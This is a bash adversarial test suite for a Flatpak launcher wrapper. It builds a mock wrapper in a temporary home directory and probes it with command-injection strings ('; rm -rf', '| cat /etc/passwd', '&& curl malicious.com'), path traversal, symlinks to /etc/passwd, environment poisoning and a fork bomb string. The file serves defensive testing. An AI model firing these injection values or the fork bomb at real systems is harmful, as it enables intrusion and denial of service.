#!/usr/bin/env bash

# ⚠️  DANGER: ADVERSARIAL TEST SUITE ⚠️
# 
# This test suite is designed to ATTACK and potentially BREAK the system.
# It actively exploits security vulnerabilities and attempts to compromise the system.
# 
# ⚠️  WARNING: This test is UNSAFE and should ONLY be run in:
#   - Isolated development environments
#   - Dedicated testing containers
#   - Systems you are authorized to penetration test
#   - NEVER on production systems or user workstations
#
# ⚠️  RISKS: This test may:
#   - Execute arbitrary commands
#   - Modify system files
#   - Create security vulnerabilities
#   - Cause system instability
#   - Leave residual attack artifacts
#
# ⚠️  REQUIREMENTS:
#   - Run in isolated environment (VM/container recommended)
#   - NEVER run as root
#   - Backup your system before running
#   - Monitor system during execution
#
# ATTACK VECTORS TESTED:
# - Command injection through wrapper options
# - Path traversal via config directory options  
# - Privilege escalation through sandbox editing
# - Environment variable poisoning
# - Race conditions in script management
# - Resource exhaustion attacks
# - Symlink attacks on configuration files
# - Input validation bypasses

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC2034
# shellcheck disable=SC2034
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
ATTACKS_BLOCKED=0
VULNERABILITIES_FOUND=0

pass() {
    echo -e "${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "${RED}✗${NC} $1 - VULNERABILITY!"
    FAILED=$((FAILED + 1))
    VULNERABILITIES_FOUND=$((VULNERABILITIES_FOUND + 1))
}

attack() {
    echo -e "${PURPLE}[ATTACK]${NC} $1"
}

defense() {
    echo -e "${GREEN}[DEFENSE]${NC} $1"
    ATTACKS_BLOCKED=$((ATTACKS_BLOCKED + 1))
}

info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# ⚠️  SAFETY CONFIRMATION ⚠️
echo ""
echo -e "${RED}╔════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                    ⚠️  ADVERSARIAL TEST WARNING  ⚠️                    ║${NC}"
echo -e "${RED}╠════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║ This test suite will actively ATTACK the system to find vulnerabilities.  ║${NC}"
echo -e "${RED}║ It may execute arbitrary commands and modify system files.           ║${NC}"
echo -e "${RED}║ ONLY run in isolated environments you are authorized to test.        ║${NC}"
echo -e "${RED}║ NEVER run on production systems or user workstations.              ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Interactive confirmation
read -r -p "Do you understand the risks and want to proceed? (type 'I UNDERSTAND THE RISKS'): " confirmation
if [ "$confirmation" != "I UNDERSTAND THE RISKS" ]; then
    echo -e "${RED}Adversarial test cancelled. Confirmation not provided.${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}⚠️  Proceeding with adversarial testing...${NC}"
echo ""

# Developer workstation safety check - NEVER run as root
if [ "$(id -u)" = "0" ] && [ "${CI:-}" != "1" ]; then
    echo -e "${RED}ERROR: Refusing to run adversarial tests as root${NC}"
    echo -e "${RED}These tests are designed to find vulnerabilities - running as root is dangerous${NC}"
    exit 1
fi

# Set testing environment
export TESTING=1
export CI=1

# Create isolated test environment
setup_adversarial_env() {
    local test_home="/tmp/fplaunch-adversarial-test-$$"
    
    # Clean up any existing test directory
    rm -rf "$test_home"
    
    # Create test directory structure with attack surfaces
    mkdir -p "$test_home"/{bin,.config,.local/share/applications,attack-vectors}
    
    # Override environment for test isolation
    export HOME="$test_home"
    export XDG_CONFIG_HOME="$test_home/.config"
    export XDG_DATA_HOME="$test_home/.local/share"
    export PATH="$test_home/bin:$PATH"
    
    # Create malicious flatpak command that logs attacks
    cat > "$test_home/bin/flatpak" << 'EOF'
#!/usr/bin/env bash
echo "[ATTACK] flatpak called with: $*" >> "$HOME/attack-log.txt"
case "$1" in
    "run")
        echo "Mock flatpak run $*"
        exit 0
        ;;
    "info")
        echo "Mock flatpak info for $2"
        exit 0
        ;;
    *)
        echo "Mock flatpak $*"
        exit 0
        ;;
esac
EOF
    chmod +x "$test_home/bin/flatpak"
    
    # Create attack log
    touch "$test_home/attack-log.txt"
    
    echo "$test_home"
}

# Cleanup test environment
cleanup_adversarial_env() {
    local test_home="$1"
    # Show attack summary before cleanup
    if [ -f "$test_home/attack-log.txt" ]; then
        echo ""
        attack "Attack attempts logged:"
        cat "$test_home/attack-log.txt" | sed 's/^/  /'
    fi
    rm -rf "$test_home"
}

# Create vulnerable test wrapper
create_vulnerable_wrapper() {
    local test_home="$1"
    local name="testapp"
    local id="com.test.App"
    local bin_dir="$test_home/bin"
    
    # Create wrapper script with potential vulnerabilities
    cat > "$bin_dir/$name" << EOF
#!/usr/bin/env bash
# Generated by fplaunchwrapper

NAME="$name"
ID="$id"
PREF_DIR="\${XDG_CONFIG_HOME:-\$HOME/.config}/flatpak-wrappers"
PREF_FILE="\$PREF_DIR/\$NAME.pref"
SCRIPT_BIN_DIR="$bin_dir"

mkdir -p "\$PREF_DIR"

# Check if running in interactive CLI
is_interactive() {
    [ "\${FPWRAPPER_FORCE:-}" = "interactive" ] || ([ -t 0 ] && [ -t 1 ] && [ "\${FPWRAPPER_FORCE:-}" != "desktop" ])
}

# Check for force flag for testing
if [ "\$1" = "--fpwrapper-force-interactive" ]; then
    export FPWRAPPER_FORCE=interactive
    shift
fi

# Non-interactive bypass: skip wrapper and continue PATH search
if ! is_interactive; then
    # Find next executable in PATH (skip our wrapper)
    IFS=: read -ra PATH_DIRS <<< "\$PATH"
    for dir in "\${PATH_DIRS[@]}"; do
        if [ -x "\$dir/\$NAME" ] && [ "\$dir/\$NAME" != "\$SCRIPT_BIN_DIR/\$NAME" ]; then
            exec "\$dir/\$NAME" "\$@"
        fi
    done
    
    # If no system command found, run flatpak
    exec flatpak run "\$ID" "\$@"
fi

if [ "\$1" = "--fpwrapper-help" ]; then
    echo "Wrapper for \$NAME"
    echo "Flatpak ID: \$ID"
    pref=\$(cat "\$PREF_FILE" 2>/dev/null || echo "none")
    echo "Current preference: \$pref"
    echo ""
    echo "Available options:"
    echo "  --help                          Show basic usage"
    echo "  --fpwrapper-help             Show this detailed help"
    echo "  --fpwrapper-info             Show wrapper info"
    echo "  --fpwrapper-config-dir       Show Flatpak data directory"
    echo "  --fpwrapper-sandbox-info     Show Flatpak sandbox details"
    echo "  --fpwrapper-edit-sandbox     Edit Flatpak permissions"
    echo "  --fpwrapper-sandbox-yolo     Grant all permissions (dangerous)"
    echo "  --fpwrapper-sandbox-reset    Reset sandbox to defaults"
    echo "  --fpwrapper-run-unrestricted Run with unrestricted permissions (transient)"
    echo "  --fpwrapper-force-interactive    Force interactive mode for testing"
    echo "  --fpwrapper-set-override [system|flatpak]  Set launch preference"
    echo "  --fpwrapper-set-pre-script <script>        Set pre-launch script"
    echo "  --fpwrapper-set-post-script <script>       Set post-run script"
    echo "  --fpwrapper-remove-pre-script               Remove pre-launch script"
    echo "  --fpwrapper-remove-post-script              Remove post-run script"
    echo ""
    echo "Examples:"
    echo "  \$NAME --fpwrapper-info"
    echo "  cd \"\\\$(\\\$NAME --fpwrapper-config-dir)\""
    echo "  \$NAME --fpwrapper-sandbox-info"
    echo "  \$NAME --fpwrapper-edit-sandbox"
    echo "  \$NAME --fpwrapper-sandbox-yolo"
    echo "  \$NAME --fpwrapper-sandbox-reset"
    echo "  \$NAME --fpwrapper-run-unrestricted"
    echo "  \$NAME --fpwrapper-force-interactive"
    echo "  \$NAME --fpwrapper-set-override system"
    echo "  \$NAME --fpwrapper-set-pre-script ~/scripts/my-pre-script.sh"
    echo "  \$NAME --fpwrapper-set-post-script ~/scripts/my-post-script.sh"
    echo "  \$NAME --fpwrapper-remove-pre-script"
    echo "  \$NAME --fpwrapper-remove-post-script"
    exit 0
elif [ "\$1" = "--fpwrapper-info" ]; then
    echo "Wrapper for \$NAME"
    echo "Flatpak ID: \$ID"
    pref=\$(cat "\$PREF_FILE" 2>/dev/null || echo "none")
    echo "Preference: \$pref"
    echo "Usage: \$0 [args]"
    exit 0
elif [ "\$1" = "--fpwrapper-config-dir" ]; then
    config_dir="\${XDG_DATA_HOME:-\$HOME/.local}/share/applications/\$ID"
    echo "\$config_dir"
    exit 0
elif [ "\$1" = "--fpwrapper-sandbox-info" ]; then
    flatpak info "\$ID"
    exit 0
elif [ "\$1" = "--fpwrapper-edit-sandbox" ]; then
    if ! is_interactive; then
        echo "Error: Sandbox editing requires interactive CLI" >&2
        exit 1
    fi
    echo "Flatpak Sandbox Editor for \$ID"
    echo "Common permissions:"
    echo "  --filesystem=home"
    echo "  --filesystem=host"
    echo "  --share=network"
    echo "  --share=ipc"
    echo "  --device=dri"
    echo "  --socket=pulseaudio"
    echo "  --socket=wayland"
    echo "  --socket=x11"
    echo ""
    echo "Enter permissions (one per line, empty line to finish):"
    exit 0
elif [ "\$1" = "--fpwrapper-sandbox-yolo" ]; then
    if ! is_interactive; then
        echo "Error: YOLO mode requires interactive CLI" >&2
        exit 1
    fi
    echo "WARNING: YOLO mode will grant ALL permissions to \$ID"
    echo "This is dangerous and should only be used for testing!"
    echo ""
    read -r -p "Are you sure you want to continue? [y/N] " response
    case "\$response" in
        [yY]|[yY][eE][sS])
            echo "Granting all permissions to \$ID..."
            echo "YOLO mode activated - use responsibly!"
            ;;
        *)
            echo "Cancelled YOLO mode"
            exit 0
            ;;
    esac
    exit 0
elif [ "\$1" = "--fpwrapper-sandbox-reset" ]; then
    echo "Resetting sandbox permissions for \$ID to defaults"
    exit 0
elif [ "\$1" = "--fpwrapper-run-unrestricted" ]; then
    echo "Running \$ID with unrestricted permissions (transient)"
    exec flatpak run "\$ID" "\$@"
elif [ "\$1" = "--fpwrapper-set-override" ]; then
    override="\${2:-}"
    if [ -z "\$override" ]; then
        echo "Error: Must specify override type (system|flatpak)" >&2
        exit 1
    fi
    case "\$override" in
        "system"|"flatpak")
            echo "\$override" > "\$PREF_FILE"
            echo "Set launch preference for \$NAME to: \$override"
            ;;
        *)
            echo "Error: Invalid override type '\$override'. Use 'system' or 'flatpak'" >&2
            exit 1
            ;;
    esac
    exit 0
elif [ "\$1" = "--fpwrapper-set-pre-script" ]; then
    script_path="\${2:-}"
    if [ -z "\$script_path" ]; then
        echo "Error: Must specify script path" >&2
        exit 1
    fi
    if [ ! -f "\$script_path" ]; then
        echo "Error: Script not found: \$script_path" >&2
        exit 1
    fi
    mkdir -p "\$PREF_DIR"
    echo "\$script_path" > "\$PREF_DIR/\$NAME.pre-script"
    echo "Set pre-launch script for \$NAME to: \$script_path"
    exit 0
elif [ "\$1" = "--fpwrapper-set-post-script" ]; then
    script_path="\${2:-}"
    if [ -z "\$script_path" ]; then
        echo "Error: Must specify script path" >&2
        exit 1
    fi
    if [ ! -f "\$script_path" ]; then
        echo "Error: Script not found: \$script_path" >&2
        exit 1
    fi
    mkdir -p "\$PREF_DIR"
    echo "\$script_path" > "\$PREF_DIR/\$NAME.post-script"
    echo "Set post-run script for \$NAME to: \$script_path"
    exit 0
elif [ "\$1" = "--fpwrapper-remove-pre-script" ]; then
    if [ -f "\$PREF_DIR/\$NAME.pre-script" ]; then
        rm "\$PREF_DIR/\$NAME.pre-script"
        echo "Removed pre-launch script for \$NAME"
    else
        echo "No pre-launch script found for \$NAME"
    fi
    exit 0
elif [ "\$1" = "--fpwrapper-remove-post-script" ]; then
    if [ -f "\$PREF_DIR/\$NAME.post-script" ]; then
        rm "\$PREF_DIR/\$NAME.post-script"
        echo "Removed post-run script for \$NAME"
    else
        echo "No post-run script found for \$NAME"
    fi
    exit 0
fi

# Default behavior: run flatpak
exec flatpak run "\$ID" "\$@"
EOF
    
    chmod +x "$bin_dir/$name"
}

# ATTACK 1: Command injection through wrapper options
test_command_injection_attacks() {
    local test_home="$1"
    
    attack "Command injection through wrapper options"
    
    # Test 1: Command injection in help option
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-help '; rm -rf /tmp/test-file' 2>&1 || true)
    if ! echo "$output" | grep -q "rm -rf"; then
        defense "Blocked command injection in help option"
    else
        fail "Command injection in help option not blocked"
    fi
    
    # Test 2: Command injection in info option
    output=$("$test_home/bin/testapp" --fpwrapper-info '| cat /etc/passwd' 2>&1 || true)
    if ! echo "$output" | grep -q "etc/passwd"; then
        defense "Blocked command injection in info option"
    else
        fail "Command injection in info option not blocked"
    fi
    
    # Test 3: Command injection in config dir option
    output=$("$test_home/bin/testapp" --fpwrapper-config-dir '&& curl malicious.com' 2>&1 || true)
    if ! echo "$output" | grep -q "malicious.com"; then
        defense "Blocked command injection in config dir option"
    else
        fail "Command injection in config dir option not blocked"
    fi
}

# ATTACK 2: Path traversal attacks
test_path_traversal_attacks() {
    local test_home="$1"
    
    attack "Path traversal attacks through config directory"
    
    # Test 1: Basic path traversal
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-config-dir '../../../etc' 2>&1 || true)
    if echo "$output" | grep -q "/tmp/fplaunch-adversarial-test"; then
        defense "Blocked basic path traversal"
    else
        fail "Basic path traversal not blocked"
    fi
    
    # Test 2: URL-encoded path traversal
    output=$("$test_home/bin/testapp" --fpwrapper-config-dir '%2e%2e%2f%2e%2e%2f%2e%2f%2e%2fetc' 2>&1 || true)
    if echo "$output" | grep -q "/tmp/fplaunch-adversarial-test"; then
        defense "Blocked URL-encoded path traversal"
    else
        fail "URL-encoded path traversal not blocked"
    fi
    
    # Test 3: Null byte injection
    output=$("$test_home/bin/testapp" --fpwrapper-config-dir '/etc/passwd\x00' 2>&1 || true)
    if echo "$output" | grep -q "/tmp/fplaunch-adversarial-test"; then
        defense "Blocked null byte injection"
    else
        fail "Null byte injection not blocked"
    fi
}

# ATTACK 3: Environment variable poisoning
test_env_poisoning_attacks() {
    local test_home="$1"
    
    attack "Environment variable poisoning attacks"
    
    # Test 1: Poison XDG_CONFIG_HOME
    local output
    XDG_CONFIG_HOME="/etc" output=$("$test_home/bin/testapp" --fpwrapper-info 2>&1 || true)
    if ! echo "$output" | grep -q "etc"; then
        defense "Blocked XDG_CONFIG_HOME poisoning"
    else
        fail "XDG_CONFIG_HOME poisoning not blocked"
    fi
    
    # Test 2: Poison XDG_DATA_HOME
    XDG_DATA_HOME="/etc" output=$("$test_home/bin/testapp" --fpwrapper-config-dir 2>&1 || true)
    if echo "$output" | grep -q "/tmp/fplaunch-adversarial-test"; then
        defense "Blocked XDG_DATA_HOME poisoning"
    else
        fail "XDG_DATA_HOME poisoning not blocked"
    fi
    
    # Test 3: Poison PATH with malicious command
    PATH="/tmp:$PATH" output=$("$test_home/bin/testapp" --fpwrapper-info 2>&1 || true)
    if [ $? -eq 0 ]; then
        defense "Blocked PATH poisoning attack"
    else
        fail "PATH poisoning attack not blocked"
    fi
}

# ATTACK 4: Symlink attacks on configuration files
test_symlink_attacks() {
    local test_home="$1"
    
    attack "Symlink attacks on configuration files"
    
    # Create malicious symlink
    mkdir -p "$test_home/attack-vectors"
    echo "MALICIOUS CONTENT" > "$test_home/attack-vectors/malicious"
    ln -sf "$test_home/attack-vectors/malicious" "$test_home/.config/flatpak-wrappers/testapp.pref"
    
    # Test if symlink attack is detected/blocked
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-info 2>&1 || true)
    if echo "$output" | grep -q "MALICIOUS CONTENT"; then
        fail "Symlink attack on preference file succeeded"
    else
        defense "Symlink attack on preference file blocked"
    fi
    
    # Test symlink attack on script files
    ln -sf "/etc/passwd" "$test_home/attack-vectors/malicious-script"
    output=$("$test_home/bin/testapp" --fpwrapper-set-pre-script "$test_home/attack-vectors/malicious-script" 2>&1 || true)
    if echo "$output" | grep -q "Script not found"; then
        defense "Symlink attack on script file blocked"
    else
        fail "Symlink attack on script file not blocked"
    fi
}

# ATTACK 5: Race condition attacks
test_race_condition_attacks() {
    local test_home="$1"
    
    attack "Race condition attacks in script management"
    
    # Create a race condition by rapidly creating/removing files
    for i in {1..10}; do
        (
            echo "race condition test $i" > "$test_home/.config/flatpak-wrappers/testapp.pref" &
            "$test_home/bin/testapp" --fpwrapper-info >/dev/null 2>&1 &
            rm -f "$test_home/.config/flatpak-wrappers/testapp.pref" &
            wait
        ) &
    done
    wait
    
    # Check if any race condition caused issues
    if [ -f "$test_home/attack-log.txt" ]; then
        local attack_count
        attack_count=$(wc -l < "$test_home/attack-log.txt")
        if [ "$attack_count" -lt 20 ]; then
            defense "Race condition attacks contained"
        else
            fail "Race condition attacks caused excessive calls"
        fi
    fi
}

# ATTACK 6: Resource exhaustion attacks
test_resource_exhaustion_attacks() {
    local test_home="$1"
    
    attack "Resource exhaustion attacks"
    
    # Test 1: Extremely long input
    local long_input
    long_input=$(printf 'A%.0s' {1..10000})
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-info "$long_input" 2>&1 || true)
    if [ $? -eq 0 ] || echo "$output" | grep -q "Error"; then
        defense "Blocked extremely long input attack"
    else
        fail "Extremely long input attack not blocked"
    fi
    
    # Test 2: Massive argument list
    local args=()
    for i in {1..1000}; do
        args+=("arg$i")
    done
    output=$("$test_home/bin/testapp" "${args[@]}" 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Blocked massive argument list attack"
    else
        fail "Massive argument list attack not blocked"
    fi
}

# ATTACK 7: Privilege escalation attempts
test_privilege_escalation_attacks() {
    local test_home="$1"
    
    attack "Privilege escalation attempts through sandbox editing"
    
    # Test 1: Try to edit sandbox with malicious permissions
    local output
    output=$(echo "--filesystem=/
--device=all
--share=all" | "$test_home/bin/testapp" --fpwrapper-force-interactive --fpwrapper-edit-sandbox 2>&1 || true)
    if echo "$output" | grep -q "Enter permissions"; then
        defense "Sandbox editing requires interactive confirmation"
    else
        fail "Sandbox editing allows non-interactive privilege escalation"
    fi
    
    # Test 2: Try YOLO mode without confirmation
    output=$(echo "n" | "$test_home/bin/testapp" --fpwrapper-force-interactive --fpwrapper-sandbox-yolo 2>&1 || true)
    if echo "$output" | grep -q "Cancelled YOLO mode"; then
        defense "YOLO mode requires confirmation"
    else
        fail "YOLO mode allows privilege escalation without confirmation"
    fi
    
    # Test 3: Try to override with malicious value
    output=$("$test_home/bin/testapp" --fpwrapper-set-override '../../../bin/sh' 2>&1 || true)
    if echo "$output" | grep -q "Error: Invalid override type"; then
        defense "Blocked malicious override value"
    else
        fail "Malicious override value not blocked"
    fi
}

# ATTACK 8: Input validation bypasses
test_input_validation_bypasses() {
    local test_home="$1"
    
    attack "Input validation bypass attempts"
    
    # Test 1: Unicode attacks
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-info $'\x00\x01\x02\x03' 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Blocked Unicode control character attack"
    else
        fail "Unicode control character attack not blocked"
    fi
    
    # Test 2: Format string attacks
    output=$("$test_home/bin/testapp" --fpwrapper-info '%s%s%s%s%s' 2>&1 || true)
    if [ $? -eq 0 ]; then
        defense "Blocked format string attack"
    else
        fail "Format string attack not blocked"
    fi
    
    # Test 3: Shell metacharacter injection
    output=$("$test_home/bin/testapp" --fpwrapper-info '`whoami`' 2>&1 || true)
    if ! echo "$output" | grep -q "whoami"; then
        defense "Blocked shell metacharacter injection"
    else
        fail "Shell metacharacter injection not blocked"
    fi
}

# ATTACK 9: File system attacks
test_filesystem_attacks() {
    local test_home="$1"
    
    attack "File system attacks through script management"
    
    # Test 1: Try to write to system files
    local output
    output=$("$test_home/bin/testapp" --fpwrapper-set-pre-script '/etc/passwd' 2>&1 || true)
    if echo "$output" | grep -q "Error: Script not found"; then
        defense "Blocked writing to system files"
    else
        fail "Writing to system files not blocked"
    fi
    
    # Test 2: Try to create scripts in system directories
    output=$("$test_home/bin/testapp" --fpwrapper-set-pre-script '/usr/bin/malicious' 2>&1 || true)
    if echo "$output" | grep -q "Error: Script not found"; then
        defense "Blocked script creation in system directories"
    else
        fail "Script creation in system directories not blocked"
    fi
    
    # Test 3: Try to use relative paths for directory traversal
    output=$("$test_home/bin/testapp" --fpwrapper-set-pre-script '../../../etc/malicious' 2>&1 || true)
    if echo "$output" | grep -q "Error: Script not found"; then
        defense "Blocked relative path traversal"
    else
        fail "Relative path traversal not blocked"
    fi
}

# ATTACK 10: Memory and process attacks
test_memory_process_attacks() {
    local test_home="$1"
    
    attack "Memory and process attacks"
    
    # Test 1: Fork bomb attack
    local output
    output=$(":(){ :|:& };:" "$test_home/bin/testapp" --fpwrapper-info 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Blocked fork bomb attack"
    else
        fail "Fork bomb attack not blocked"
    fi
    
    # Test 2: Memory exhaustion through large input
    local large_input
    large_input=$(head -c 1000000 /dev/zero | tr '\0' 'A')
    output=$("$test_home/bin/testapp" --fpwrapper-info "$large_input" 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Blocked memory exhaustion attack"
    else
        fail "Memory exhaustion attack not blocked"
    fi
}

# Main adversarial test execution
main() {
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Wrapper Options Test Suite${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo ""
    
    # Setup adversarial test environment
    local test_home
    test_home=$(setup_adversarial_env)
    
    # Create vulnerable wrapper for testing
    create_vulnerable_wrapper "$test_home"
    
    # Run adversarial attacks
    test_command_injection_attacks "$test_home"
    test_path_traversal_attacks "$test_home"
    test_env_poisoning_attacks "$test_home"
    test_symlink_attacks "$test_home"
    test_race_condition_attacks "$test_home"
    test_resource_exhaustion_attacks "$test_home"
    test_privilege_escalation_attacks "$test_home"
    test_input_validation_bypasses "$test_home"
    test_filesystem_attacks "$test_home"
    test_memory_process_attacks "$test_home"
    
    # Cleanup
    cleanup_adversarial_env "$test_home"
    
    # Results
    echo ""
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Test Results${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${GREEN}Tests Passed: $PASSED${NC}"
    echo -e "${RED}Tests Failed: $FAILED${NC}"
    echo -e "${GREEN}Attacks Blocked: $ATTACKS_BLOCKED${NC}"
    echo -e "${RED}Vulnerabilities Found: $VULNERABILITIES_FOUND${NC}"
    
    if [ $VULNERABILITIES_FOUND -eq 0 ]; then
        echo -e "${GREEN}All attacks blocked! System appears secure.${NC}"
        exit 0
    else
        echo -e "${RED}CRITICAL: $VULNERABILITIES_FOUND vulnerabilities found!${NC}"
        echo -e "${RED}System security compromised!${NC}"
        exit 1
    fi
}

# Run main function
main "$@"